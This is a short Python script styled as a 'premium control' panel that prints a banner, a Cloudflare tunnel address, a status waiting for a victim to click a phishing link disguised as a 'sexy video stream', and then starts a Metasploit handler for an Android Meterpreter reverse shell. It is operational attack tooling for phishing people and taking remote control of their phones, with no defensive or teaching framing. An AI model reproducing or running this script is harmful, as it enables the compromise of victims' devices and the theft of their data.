import os
import time

# VIP Colors
BLUE = '\033[94m'
CYAN = '\033[96m'
WHITE = '\033[0m'
BOLD = '\033[1m'

def outlofar_banner():
    os.system('clear')
    print(f"{BLUE}{BOLD}")
    # Blue Flaming Skull VIP Design
    print("""
             .-------.
            /   VIP   \\
           |  ()   ()  |
            \    ^    /
             |||||||||
             |||||||||
    """)
    print(f"{CYAN}      [ OUTLOFAR PREMIUM CONTROL V14 ]")
    print(f"{BLUE}" + "="*50 + f"{WHITE}")

def start_connection():
    outlofar_banner()
    # Active Tunnel Details
    print(f"[*] TUNNEL: gray-participants-florist-individuals.trycloudflare.com")
    print(f"[*] STATUS: WAITING FOR CLICK ON PHISHING LINK...")
    print(f"[*] TEMPLATE: SEXY VIDEO STREAM")
    print(f"[*] WAKE LOCK: ACTIVE")
    print(f"{BLUE}" + "="*50 + f"{WHITE}")
    
    # Asli control listener start karne ke liye
    os.system("msfconsole -q -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 127.0.0.1; set LPORT 4444; exploit'")

if __name__ == "__main__":
    start_connection()
